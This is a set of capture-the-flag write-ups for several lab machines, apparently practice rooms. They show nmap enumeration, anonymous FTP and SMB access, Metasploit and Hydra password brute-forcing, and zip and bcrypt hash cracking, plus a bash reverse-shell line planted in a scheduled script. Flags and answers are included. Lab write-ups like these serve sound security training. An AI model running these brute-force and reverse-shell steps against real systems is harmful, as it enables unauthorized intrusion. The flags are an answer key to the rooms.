
## Brooklyn Nine-Nine

Scan target IP Address
```
nmap -sV -sC  10.10.208.225

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.159.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

```
Exploitable anonymous ftp login allowed 

Login to FTP with no password
```
ftp <target_ipaddress> 

Name (10.10.208.225:root): anonymous 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

List directory and download text file
```
ftp> dir
ftp> get note_to_jake.txt
ftp> exit

cat note_to_jake.txt
```
Reading the note tells me that the name of one the users needed to login is Jake

Attempt to use Jake's name during an ssh login
set username, remote host, and set pass_file to find the password associated with the user Jake
```
msfupdate
service postgresql start && msfconsole -q 
search ssh_login
use auxiliary/scanner/ssh/ssh_login
setg rhosts 10.10.208.225 
set /usr/share/wordlists/rockyou.txt
set username jake
exploit

[+] 10.10.208.225:22 - Success: 'jake:987654321' 'uid=1000(jake) gid=1000(jake) groups=1000(jake) Linux brookly_nine_nine 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
```

Login into the remote server using the new found password credentials for the user Jake
```
ssh jake@10.10.208.225
password: 987654321
```

Navigate through the server to find the flag
```
cd /home
cd halt
cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```


## Anonymous (Not Done)


Enumerate the machine.  How many ports are open?
```
nmap -sV -sC 10.10.154.70

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.169.80
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:1B:D1:3E:A6:F1 (Unknown)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-08-24T17:43:56
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-08-24T17:43:56+00:00

```

What service is running on port 21?
```
ftp
```

What service is running on ports 139 and 445?
```
smb
```


```
cd /usr/share/nmap/scripts  
ls -al | grep smb 
nmap --script smb-enum-shares.nse -p445 10.10.154.70

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:1B:D1:3E:A6:F1 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.154.70\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (anonymous server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.154.70\pics: 
|     Type: STYPE_DISKTREE
|     Comment: My SMB Share Directory for Pics
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\namelessone\pics
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.154.70\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

```


```
nmap --script smb-enum-users.nse -p445 10.10.154.70

445/tcp open  microsoft-ds
MAC Address: 02:1B:D1:3E:A6:F1 (Unknown)

Host script results:
| smb-enum-users: 
|   ANONYMOUS\namelessone (RID: 1003)
|     Full name:   namelessone
|     Description: 
|_    Flags:       Normal user account
```

Brute force smb login with username found from enumeration and the password file rockyou.txt
```
use  auxiliar/scanner/smb/smb_login
set smbuser namelessone
set pass_file /usr/share/wordlists/rockyou.txt
exploit

[+] 10.10.154.70:445      - 10.10.154.70:445 - Success: '.\namelessone:123456'

```

Attempt to sign into the smb share with the username namelessone
```
smclient //server/share -U namelessone
password:123456 
```


Login into the server with anon credentials
delete current bash script clean.sh, being executed
edit the file to include the lines below, which should pop a shell. 
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```



---------------
## Easy Peasy

#### Enumeration through NMAP

```
nmap -p- -T 4 -v 10.10.240.238

PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
```

How many ports are open ? 
```
3
```


```
nmap -sV -sC  -p 80 10.10.240.238

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:8E:4B:97:AE:4D (Unknown)
```

What is the version of nginx?
```
1.16.1
```

What is running on the highest port?
```
nmap -sV -sC  -p 65524 10.10.240.238

65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
```

## Compromising the Machine

```
gobuster dir  --wordlist big.txt --url http://10.10.240.238:65524/

/.htpasswd            (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 281]

```

Found at http://10.10.240.238:65524/
by viewing the page source
from base64 it reveals a url path
```
its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu

base64 > /n0th1ng3ls3m4tt3r
```

Found at http://10.10.240.238:80/hidden/whatever
by viewing the page source
Convert hash of base64 
```
hidden>ZmxhZ3tmMXJzN19mbDRnfQ==

flag{f1rs7_fl4g}
```

Found at http://10.10.240.238:65524/robots.txt
convert the md5 hash to the flag
```
a18672860d0510e5ab6699730763b250

flag{1m_s3c0nd_fl4g}
```


```
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```




--------------- 
## Golden Eye (Not Done)

#### Intro and Enumeration

Use nmap to scan the network for all ports. How many ports are open?
```
nmap -p- -T 4 -v 10.10.108.12

4
```

Who needs to make sure they update their default password?
```
boris
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```
Convert the Decimal code to Characters
```
InvincibleHack3r
```
Other user is called natalya


####  It's mail Time

If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?
```
hydra -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.108.12 -s 55007 pop3 
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 10.10.108.12 -s 55007 pop3 

[55007][pop3] host: 10.10.108.12   login: boris   password: secret1!
[55007][pop3] host: 10.10.108.12   login: natalya   password: bird

```

Log into the pop3 server using the new found credentials of boris
```
telnet 10.10.108.12 55007

user boris
pass secret1! 

list 

retr 1 
retr 2 
retr 3 
```
Other user -> janus

Inspect port 55007, what services is configured to use this port?
```
telnet
```

What can you find on this service?
```
emails
```

What user can break bori's code ? 
```
natalya
```



#### GoldenEye Operators Training

Try using the credentials you found earlier. Which user can you login as?
```
telnet 10.10.108.12 55007
user natalya
pass bird 
list 
retr 2 

username: xenia
password: RCP90rulez!
```

Have a poke around the site. What other user can you find?
```
doak
```

What was this users password?
```
goat
```
#### Privilege Escalation



--------


## HA Joker CTF (Not Done)

What version of Apache is it?
```
nmap -sV -sC -p 80,8080 10.10.225.38

80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: localhost
```

What port on this machine not need to be authenticated by user and password?
```
80
```

There is a file on this port that seems to be secret, what is it?
```
secret.txt
```

There is another file which reveals information of the backend, what is it?
```
phpinfo.php
```

When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?
```
joker
```

What port on this machine need to be authenticated by Basic Authentication Mechanism?
```
8080
```

At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?
```
hydra -l joker P /usr/share/wordlists/rockyou.txt -s 8080 10.10.225.38 http-get

[8080][http-get] host: 10.10.225.38   login: joker   password: hannah
```

Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?
```
gobuster dir -U joker -P hannah --url http://10.10.50.115:8080 --wordlist /usr/share/wordlists/dirb/common.txt 

/administrator (Status: 301)
```

We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?
```
backup.zip
```

We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?
```
zip2john backup.zip > backup.hash
john backup.hash

hannah
```

Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?
```
grep cc1gr_users jooladb.sql | grep user

INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);

admin
```

Super Duper User! What is the password?
```
hashcat -a 0 -m 3200 pass.txt /usr/share/wordlists/rockyou.txt --force 

abcd1234
```

At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?
```

```

This user belongs to a group that differs on your own group, What is this group?
```

```